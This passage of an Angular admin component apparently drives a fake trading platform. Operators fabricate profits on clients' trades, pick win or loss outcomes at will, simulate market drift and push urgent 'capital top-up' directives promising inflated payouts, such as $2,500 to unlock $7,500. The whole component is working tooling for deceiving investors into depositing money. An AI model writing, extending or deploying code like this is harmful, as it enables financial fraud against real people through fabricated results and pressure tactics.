                  (click)="closeWithOutcome(t.id, 'LOSS')"
                  class="px-3 py-1.5 rounded-lg bg-rose-500/20 hover:bg-rose-500/30 text-rose-300 border border-rose-500/40 text-xs font-bold transition flex items-center space-x-1 active:scale-95"
                  title="Close with simulated loss"
                >
                  <span>🔻 Close Loss</span>
                </button>
              </div>
            </div>

          </div>
        </div>
      </div>

    </div>
  `
})
export class AdminTradeControllerComponent implements OnInit {
  adminService = inject(AdminService);
  marketService = inject(MarketService);
  stockService = inject(StockService);
  toast = inject(ToastService);

  users = signal<any[]>([]);
  managedTrades = signal<any[]>([]);
  activePrompts = signal<any[]>([]);
  loading = signal<boolean>(false);
  liveDriftEnabled = signal<boolean>(true);

  activeTab: 'basket' | 'prompt' | 'single' = 'basket';
  selectedUserId: number | null = 1;

  // Single Trade Form State
  selectedPair = 'BTC/USDT';
  tradeSide: 'BUY' | 'SELL' = 'BUY';
  tradeAmount = 0.25;
  initialProfit = 250.00;
  targetOutcome = 'IN_PROGRESS';
  adminNotes = 'VIP Institutional Managed Trade';

  // Prompt Form State
  promptTitle = 'Target Profit Breakout: Capital Top-Up Required';
  promptMessage = 'Senior trading desk has entered high-momentum breakout positions on BTC + NVDA. Increase your capital by $2,500 now to unlock the projected $7,500 target payout.';
  promptTargetAmount = 2500;
  promptExpectedPayout = 7500;
  promptUrgency: 'NORMAL' | 'HIGH' | 'CRITICAL' = 'HIGH';

  // Institutional Multi-Asset Baskets
  predefinedBaskets = [
    {
      id: 'crypto_ai',
      name: 'Crypto & AI Titans',
      description: 'BTC + ETH + NVDA high-conviction growth cluster',
      assets: [
        { pair: 'BTC/USDT', side: 'BUY' as const, amount: 0.25, initial_profit: 220, target_outcome: 'IN_PROGRESS' },
        { pair: 'NVDA/USD', side: 'BUY' as const, amount: 10, initial_profit: 260, target_outcome: 'IN_PROGRESS' },
        { pair: 'ETH/USDT', side: 'BUY' as const, amount: 2.5, initial_profit: 140, target_outcome: 'IN_PROGRESS' }
      ],
      totalProfit: 620
    },
    {
      id: 'wall_street',
      name: 'Wall Street Growth Leaders',
      description: 'AAPL + MSFT + TSLA + SPY institutional index basket',
      assets: [
        { pair: 'AAPL/USD', side: 'BUY' as const, amount: 15, initial_profit: 180, target_outcome: 'IN_PROGRESS' },
        { pair: 'TSLA/USD', side: 'BUY' as const, amount: 10, initial_profit: 280, target_outcome: 'IN_PROGRESS' },
        { pair: 'MSFT/USD', side: 'BUY' as const, amount: 8, initial_profit: 210, target_outcome: 'IN_PROGRESS' },
        { pair: 'SPY/USD', side: 'BUY' as const, amount: 12, initial_profit: 230, target_outcome: 'IN_PROGRESS' }
      ],
      totalProfit: 900
    },
    {
      id: 'crypto_momentum',
      name: 'Crypto Momentum Cluster',
      description: 'BTC + SOL + BNB rapid breakout momentum cluster',
      assets: [
        { pair: 'BTC/USDT', side: 'BUY' as const, amount: 0.35, initial_profit: 320, target_outcome: 'IN_PROGRESS' },
        { pair: 'SOL/USDT', side: 'BUY' as const, amount: 25, initial_profit: 220, target_outcome: 'IN_PROGRESS' },
        { pair: 'BNB/USDT', side: 'BUY' as const, amount: 6, initial_profit: 160, target_outcome: 'IN_PROGRESS' }
      ],
      totalProfit: 700
    }
  ];

  ngOnInit() {
    this.loadUsers();
    this.loadManagedTrades();
    this.loadActivePrompts();
  }

  loadUsers() {
    this.adminService.getUsers().subscribe({
      next: (res) => {
        if (res.success) {
          this.users.set(res.data.filter(u => u.role !== 'admin'));
          if (this.users().length > 0 && !this.selectedUserId) {
            this.selectedUserId = this.users()[0].id;
          }
        }
      }
    });
  }

  onUserChange() {
    this.loadManagedTrades();
    this.loadActivePrompts();
  }

  loadManagedTrades() {
    this.adminService.getManagedTrades().subscribe({
      next: (res) => {
        if (res.success) {
          this.managedTrades.set(res.data);
        }
      }
    });
  }

  loadActivePrompts() {
    this.adminService.getBrokerPrompts(this.selectedUserId || undefined).subscribe({
      next: (res) => {
        if (res.success) {
          this.activePrompts.set(res.data);
        }
      }
    });
  }

  getTotalManagedProfit(): number {
    return this.managedTrades().reduce((acc, t) => acc + (parseFloat(t.current_profit) || 0), 0);
  }

  toggleDrift() {
    const nextState = !this.liveDriftEnabled();
    this.adminService.toggleLiveDrift(nextState).subscribe({
      next: (res) => {
        this.liveDriftEnabled.set(nextState);
        this.toast.info(`Live market drift ${nextState ? 'resumed (5s interval)' : 'paused'}`);
      },
      error: () => this.toast.error('Failed to toggle drift')
    });
  }

  launchBasket(basket: any) {
    if (!this.selectedUserId) {
      this.toast.error('Please select a client account');
      return;
    }

    this.loading.set(true);
    this.adminService.tradeMultiAssets({
      user_id: this.selectedUserId,
      assets: basket.assets,
      admin_notes: `${basket.name} Basket Execution`
    }).subscribe({
      next: (res) => {
        this.loading.set(false);
        this.toast.success(`Multi-asset basket launched! User received ${basket.assets.length} positions totalling +$${basket.totalProfit} profit.`);
        this.loadManagedTrades();
      },
      error: (err) => {
        this.loading.set(false);
        this.toast.error(err.error?.error || 'Failed to deploy basket');
      }
    });
  }

  boostAll(delta: number) {
    if (!this.selectedUserId) {
      this.toast.error('Please select a client account');
      return;
    }

    this.adminService.boostAllProfits({
      user_id: this.selectedUserId,
      delta_profit: delta
    }).subscribe({
      next: (res) => {
        this.toast.success(`All active trades boosted by +$${delta}! Client terminal updated.`);
        this.loadManagedTrades();
      },
      error: (err) => {
        this.toast.error(err.error?.error || 'Failed to boost all trades');
      }
    });
  }

  applyPromptPreset(type: string) {
    if (type === 'breakout') {
      this.promptTitle = 'Target Profit Breakout: Capital Top-Up Required';
      this.promptMessage = 'Senior trading desk has entered high-momentum breakout positions on BTC + NVDA. Increase your capital buffer by $2,500 now to unlock the projected $7,500 target payout.';
      this.promptTargetAmount = 2500;
      this.promptExpectedPayout = 7500;
      this.promptUrgency = 'HIGH';
    } else if (type === 'margin') {
      this.promptTitle = 'Portfolio Margin Buffer Directive';
      this.promptMessage = 'To safely sustain current multi-asset positions and capture upcoming earnings dividends, add $1,500 capital buffer to your active balance.';
      this.promptTargetAmount = 1500;
      this.promptExpectedPayout = 4200;
      this.promptUrgency = 'NORMAL';
    } else if (type === 'vip') {
      this.promptTitle = 'CRITICAL: Urgent Capital Top-Up for +$15,000 Payout';
      this.promptMessage = 'Tier-1 algorithmic liquidity window detected. The institutional desk requires immediate top-up of $5,000 to maximize leveraged return before session closes.';
      this.promptTargetAmount = 5000;
      this.promptExpectedPayout = 15000;
      this.promptUrgency = 'CRITICAL';
    }
  }

  handleSendPrompt() {
    if (!this.selectedUserId) {
      this.toast.error('Please select a target investor');
      return;
    }

    this.loading.set(true);
    this.adminService.sendBrokerPrompt({
      user_id: this.selectedUserId,
      title: this.promptTitle,
      message: this.promptMessage,
      target_amount: this.promptTargetAmount,
      expected_payout: this.promptExpectedPayout,
      urgency: this.promptUrgency
    }).subscribe({
      next: (res) => {
        this.loading.set(false);
        this.toast.success('Directive pushed directly to user screen!');
        this.loadActivePrompts();
      },
      error: (err) => {
        this.loading.set(false);
        this.toast.error(err.error?.error || 'Failed to dispatch directive');
      }
    });
  }

  dismissPromptAdmin(id: number) {
    this.adminService.dismissBrokerPrompt(id).subscribe({
      next: () => {
        this.toast.info('Directive dismissed');
        this.loadActivePrompts();
      },
      error: () => this.toast.error('Failed to dismiss directive')
    });
  }

  handleCreateTrade() {
    if (!this.selectedUserId) {
      this.toast.error('Please select a trader account');
      return;
    }

    this.loading.set(true);
    this.adminService.tradeForUser({
      user_id: this.selectedUserId,
      pair: this.selectedPair,
      side: this.tradeSide,
      amount: this.tradeAmount,
      initial_profit: this.initialProfit,
      target_outcome: this.targetOutcome,
      admin_notes: this.adminNotes
    }).subscribe({
      next: (res) => {
        this.loading.set(false);
        this.toast.success(`Managed trade launched! User sees +$${this.initialProfit} in real-time.`);
        this.loadManagedTrades();
      },
      error: (err) => {
        this.loading.set(false);
        this.toast.error(err.error?.error || 'Failed to execute managed trade');
      }
    });
  }

  adjustProfit(tradeId: number, delta: number) {
    this.adminService.alterTradeProfit({
      trade_id: tradeId,
      delta_profit: delta
    }).subscribe({
      next: (res) => {
        this.toast.success(`Profit ${delta >= 0 ? '+' : ''}$${delta} pushed to user chart flow!`);
        this.updateLocalTrade(res.data);
      },
      error: (err) => {
        this.toast.error(err.error?.error || 'Failed to adjust profit');
      }
    });
  }

  setExactProfit(tradeId: number, val: string) {
    const num = parseFloat(val);
    if (isNaN(num)) return;

    this.adminService.alterTradeProfit({
      trade_id: tradeId,
      new_profit: num
    }).subscribe({
      next: (res) => {
        this.toast.success(`Trade profit set to $${num.toFixed(2)} in real time!`);
        this.updateLocalTrade(res.data);
      },
      error: (err) => {
        this.toast.error(err.error?.error || 'Failed to update profit');
      }
    });
  }

  signalClosing(tradeId: number) {
    this.adminService.signalTradeClosing({ trade_id: tradeId }).subscribe({
      next: (res) => {
        this.toast.info('Deal closing window initiated! User alerted in real time.');
        this.updateLocalTrade(res.data);
      },
      error: () => this.toast.error('Failed to signal deal closing')
    });
  }

  closeWithOutcome(tradeId: number, outcome: 'WIN' | 'LOSS') {
    this.adminService.closeTrade({
      trade_id: tradeId,
      outcome
    }).subscribe({
      next: (res) => {
        this.toast.success(`Trade settled as ${outcome}! Universal USD cash credited to user.`);
        this.loadManagedTrades();
      },
      error: (err) => {
        this.toast.error(err.error?.error || 'Failed to close trade');
      }
    });
  }

  private updateLocalTrade(updated: any) {
    if (!updated) return;
    this.managedTrades.update(list => {
      const idx = list.findIndex(t => t.id === updated.id);
      if (idx >= 0) {
        const copy = [...list];
        copy[idx] = updated;
        return copy;
      }
      return [updated, ...list];
    });
  }
}
